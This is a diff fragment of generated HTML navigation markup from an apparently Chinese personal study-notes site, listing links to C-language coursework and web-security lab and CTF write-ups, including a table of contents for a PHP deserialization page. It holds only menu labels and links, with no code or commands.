+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+      
+        
+      
+        
+      
+    
+    
+      
+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+          
+        
+        <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_2_3" >
+        
+          
+          <label class="md-nav__link" for="__nav_2_3" id="__nav_2_3_label" tabindex="0">
+            
+  
+  <span class="md-ellipsis">
+    C语言
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_2_3_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_2_3">
+            <span class="md-nav__icon md-icon"></span>
+            C语言
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    
+    
+      
+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+          
+        
+        <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_2_3_1" >
+        
+          
+          <label class="md-nav__link" for="__nav_2_3_1" id="__nav_2_3_1_label" tabindex="0">
+            
+  
+  <span class="md-ellipsis">
+    Alpha
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="3" aria-labelledby="__nav_2_3_1_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_2_3_1">
+            <span class="md-nav__icon md-icon"></span>
+            Alpha
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../DEC/C/Alpha-%E6%95%B0%E7%BB%84/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Alpha 数组
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../DEC/C/Alpha-%E5%87%BD%E6%95%B0/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Alpha 函数
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../DEC/C/Alpha-%E6%8C%87%E9%92%88/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Alpha 指针
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../DEC/C/%E6%95%B0%E7%BB%84%E5%BF%85%E5%81%9A%E9%A2%98/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    数组必做题
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../DEC/C/%E6%9C%9F%E6%9C%AB%E5%BF%85%E5%81%9A%E9%A2%98/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    期末必做题
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+      
+        
+      
+    
+    
+      
+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+          
+        
+        <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_2_3_2" >
+        
+          
+          <label class="md-nav__link" for="__nav_2_3_2" id="__nav_2_3_2_label" tabindex="0">
+            
+  
+  <span class="md-ellipsis">
+    作业
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="3" aria-labelledby="__nav_2_3_2_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_2_3_2">
+            <span class="md-nav__icon md-icon"></span>
+            作业
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../DEC/C/%E9%93%BE%E8%A1%A8%E4%BD%9C%E4%B8%9A/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    链表作业
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../DEC/C/%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C%E4%BD%9C%E4%B8%9A/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    文件操作作业
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    
+    
+      
+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+          
+        
+        <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_2_3_3" >
+        
+          
+          <label class="md-nav__link" for="__nav_2_3_3" id="__nav_2_3_3_label" tabindex="0">
+            
+  
+  <span class="md-ellipsis">
+    知识点
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="3" aria-labelledby="__nav_2_3_3_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_2_3_3">
+            <span class="md-nav__icon md-icon"></span>
+            知识点
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../DEC/C/%E4%BD%8D%E8%BF%90%E7%AE%97%E6%80%BB%E7%BB%93/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    位运算总结（转载）
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../DEC/C/%E5%B8%B8%E8%80%83%E5%87%BD%E6%95%B0%E6%80%BB%E7%BB%93/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    C 语言常考函数总结
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../DEC/C/%E6%96%87%E4%BB%B6%E8%AF%BB%E5%86%99%E5%B8%B8%E7%94%A8%E5%87%BD%E6%95%B0%E6%80%BB%E7%BB%93/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    文件读写常用函数总结
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../DEC/C/Scanf%20%E8%BE%93%E5%85%A5%E5%AD%97%E7%AC%A6%E4%B8%B2%E9%81%87%E5%88%B0%E7%A9%BA%E6%A0%BC/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    使用 scanf 时对空格处理？
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+    
+  
+  
+  
+    
+    
+      
+        
+          
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    
+    
+      
+        
+        
+      
+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--section md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3" checked>
+        
+          
+          
+          <div class="md-nav__link md-nav__container">
+            <a href="../../" class="md-nav__link ">
+              
+  
+  <span class="md-ellipsis">
+    网络安全
+  </span>
+  
+
+            </a>
+            
+              
+              <label class="md-nav__link " for="__nav_3" id="__nav_3_label" tabindex="">
+                <span class="md-nav__icon md-icon"></span>
+              </label>
+            
+          </div>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_3_label" aria-expanded="true">
+          <label class="md-nav__title" for="__nav_3">
+            <span class="md-nav__icon md-icon"></span>
+            网络安全
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    
+    
+      
+      
+        
+          
+          
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--section md-nav__item--nested">
+      
+        
+        
+          
+        
+        <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_3_2" >
+        
+          
+          <label class="md-nav__link" for="__nav_3_2" id="__nav_3_2_label" tabindex="">
+            
+  
+  <span class="md-ellipsis">
+    靶场
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_3_2_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_3_2">
+            <span class="md-nav__icon md-icon"></span>
+            靶场
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../labs/Pikachu%E9%9D%B6%E5%9C%BA%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Pikachu靶场打靶记录
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../labs/upload-labs%E9%9D%B6%E5%9C%BA%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Upload labs靶场打靶记录
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../labs/xss-labs%E9%9D%B6%E5%9C%BA%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Xss labs靶场打靶记录
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../labs/Sqli-labs%E7%AC%94%E8%AE%B0/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Sqli labs笔记
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../labs/CTFHub%E6%8A%80%E8%83%BD%E6%A0%91%E7%AC%94%E8%AE%B0/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    CTFHub技能树笔记
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../labs/XXE%E6%89%93%E9%9D%B6/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    XXE 打靶记录
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    
+    
+      
+      
+        
+          
+          
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--section md-nav__item--nested">
+      
+        
+        
+          
+        
+        <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_3_3" >
+        
+          
+          <label class="md-nav__link" for="__nav_3_3" id="__nav_3_3_label" tabindex="">
+            
+  
+  <span class="md-ellipsis">
+    CTFShow
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_3_3_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_3_3">
+            <span class="md-nav__icon md-icon"></span>
+            CTFShow
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../CTFShow/CTFshow-web/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    CTFshow-WEB
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../CTFShow/CTFShow-%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    CTFshow 信息泄露
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../CTFShow/CTFShow-%E7%88%86%E7%A0%B4/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    CTFshow 爆破
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../CTFShow/CTFShow-RCE/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    CTFshow RCE
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../CTFShow/CTFShow-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    CTFshow 文件包含
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../CTFShow/CTFShow-PHP%E7%89%B9%E6%80%A7/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    CTFShow PHP特性
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../CTFShow/CTFShow-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    CTFshow 文件上传
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../CTFShow/CTFShow-Sql%E6%B3%A8%E5%85%A5/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    CTFshow Sql注入
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../CTFShow/CTFShow-XXE/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    CTFshow XXE
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+    
+  
+  
+  
+    
+    
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    
+    
+      
+      
+        
+          
+          
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--section md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3_4" checked>
+        
+          
+          <label class="md-nav__link" for="__nav_3_4" id="__nav_3_4_label" tabindex="">
+            
+  
+  <span class="md-ellipsis">
+    其他
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_3_4_label" aria-expanded="true">
+          <label class="md-nav__title" for="__nav_3_4">
+            <span class="md-nav__icon md-icon"></span>
+            其他
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../JavaScript%E7%AC%94%E8%AE%B0/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    JavaScript笔记
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+    
+  
+  
+  
+    <li class="md-nav__item md-nav__item--active">
+      
+      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
+      
+      
+        
+      
+      
+        <label class="md-nav__link md-nav__link--active" for="__toc">
+          
+  
+  <span class="md-ellipsis">
+    PHP反序列化
+  </span>
+  
+
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <a href="./" class="md-nav__link md-nav__link--active">
+        
+  
+  <span class="md-ellipsis">
+    PHP反序列化
+  </span>
+  
+
+      </a>
+      
+        
+
+<nav class="md-nav md-nav--secondary" aria-label="目录">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      目录
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#_1" class="md-nav__link">
+    <span class="md-ellipsis">
+      简介
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_2" class="md-nav__link">
+    <span class="md-ellipsis">
+      常见的序列化格式
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_3" class="md-nav__link">
+    <span class="md-ellipsis">
+      案例
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="案例">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_4" class="md-nav__link">
+    <span class="md-ellipsis">
+      数组序列化
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_5" class="md-nav__link">
+    <span class="md-ellipsis">
+      对象序列化
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_6" class="md-nav__link">
+    <span class="md-ellipsis">
+      反序列化中常见的魔术方法
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#trick" class="md-nav__link">
+    <span class="md-ellipsis">
+      反序列化绕过小Trick
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="反序列化绕过小Trick">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#php71" class="md-nav__link">
+    <span class="md-ellipsis">
+      php7.1+反序列化对类属性不敏感
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#__wakeup" class="md-nav__link">
+    <span class="md-ellipsis">
+      绕过__wakeup
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_7" class="md-nav__link">
+    <span class="md-ellipsis">
+      绕过部分正则
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_8" class="md-nav__link">
+    <span class="md-ellipsis">
+      利用引用
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#16" class="md-nav__link">
+    <span class="md-ellipsis">
+      16进制绕过字符的过滤
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#php_1" class="md-nav__link">
+    <span class="md-ellipsis">
+      PHP反序列化字符逃逸
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="PHP反序列化字符逃逸">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#1-x" class="md-nav__link">
+    <span class="md-ellipsis">
+      1. 过滤后字符变多（反序列化后的一个x替换成为两个）
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#2-x" class="md-nav__link">
+    <span class="md-ellipsis">
+      2. 过滤后字符变少(把反序列化后的两个x替换成为一个)
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_9" class="md-nav__link">
+    <span class="md-ellipsis">
+      对象注入
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#pop" class="md-nav__link">
+    <span class="md-ellipsis">
+      POP链简单介绍
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#php_2" class="md-nav__link">
+    <span class="md-ellipsis">
+      PHP原生类反序列化利用（暂无）
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#phar" class="md-nav__link">
+    <span class="md-ellipsis">
+      Phar反序列化
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Phar反序列化">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#phar_1" class="md-nav__link">
+    <span class="md-ellipsis">
+      什么是phar文件
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#phar_2" class="md-nav__link">
+    <span class="md-ellipsis">
+      phar文件的结构
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_10" class="md-nav__link">
+    <span class="md-ellipsis">
+      漏洞利用条件
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_11" class="md-nav__link">
+    <span class="md-ellipsis">
+      受影响的函数：
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_12" class="md-nav__link">
+    <span class="md-ellipsis">
+      绕过方式
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#php-session" class="md-nav__link">
+    <span class="md-ellipsis">
+      php-session反序列化
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="php-session反序列化">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#session" class="md-nav__link">
+    <span class="md-ellipsis">
+      session简单介绍
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#session_1" class="md-nav__link">
+    <span class="md-ellipsis">
+      session 的存储机制
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#sessiontip" class="md-nav__link">
+    <span class="md-ellipsis">
+      session文件创建的几个tip
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#phpinisession" class="md-nav__link">
+    <span class="md-ellipsis">
+      php.ini中一些session配置
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_13" class="md-nav__link">
+    <span class="md-ellipsis">
+      利用姿势
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#session_2" class="md-nav__link">
+    <span class="md-ellipsis">
+      使用不同的引擎来处理session文件
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../windterm%E8%BF%9E%E6%8E%A5kali/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Windterm连接kali
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../group-by%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Group by报错注入
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../information_schema/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Information schema
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../sql%E6%B3%A8%E5%85%A5-UDF%E6%8F%90%E6%9D%83/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Sql注入—udf 提权
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../mysql%E5%90%91%E6%97%A5%E5%BF%97%E6%96%87%E4%BB%B6%E5%86%99webshell/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Mysql向日志文件写webshell
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../PHP%2BMySQL%E5%8D%9A%E5%AE%A2%28%E5%88%9D%E7%BA%A7%29/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    PHP+MySQL博客（初级）
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../PHP%2BMySQL%E5%8D%9A%E5%AE%A2%28%E9%AB%98%E7%BA%A7%29/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    PHP+MySQL博客（高级）
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Python%E6%AD%A3%E5%88%99/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    python正则表达式
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    信息收集
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    
+    
+      
+      
+        
+          
+          
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--section md-nav__item--nested">
+      
+        
+        
+          
+        
+        <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_3_5" >
+        
+          
+          <label class="md-nav__link" for="__nav_3_5" id="__nav_3_5_label" tabindex="">
+            
+  
+  <span class="md-ellipsis">
+    转载
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_3_5_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_3_5">
+            <span class="md-nav__icon md-icon"></span>
+            转载
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../zhuan/%E6%96%87%E4%BB%B6%E5%A4%B4/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    文件头、尾总结
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../zhuan/HTTP%E6%8A%A5%E6%96%87/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    HTTP 报文
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../zhuan/SSH-%E8%BF%9E%E6%8E%A5%E6%97%B6%E9%97%B4%E8%B6%85%E6%97%B6/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    SSH:连接时间超时
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../zhuan/git-stash%E7%94%A8%E6%B3%95%E5%B0%8F%E7%BB%93/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    git-stash 用法小结
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../zhuan/dirsearch%E4%BD%BF%E7%94%A8%E6%8C%87%E5%8D%97/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    dirsearch 使用指南
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../zhuan/php%E4%BC%AA%E5%8D%8F%E8%AE%AE/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    常见的 php 伪协议
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../zhuan/Feroxbuster/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Feroxbuster使用说明
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../zhuan/DNS%E9%87%8D%E7%BB%91%E5%AE%9A%E6%BC%8F%E6%B4%9E/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    DNS 重绑定漏洞
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../zhuan/MySQL%20loaddata%E7%94%A8%E6%B3%95/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    MySQL loaddata用法
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../zhuan/php%E4%BC%AA%E5%8D%8F%E8%AE%AE/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    常见的 php 伪协议
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
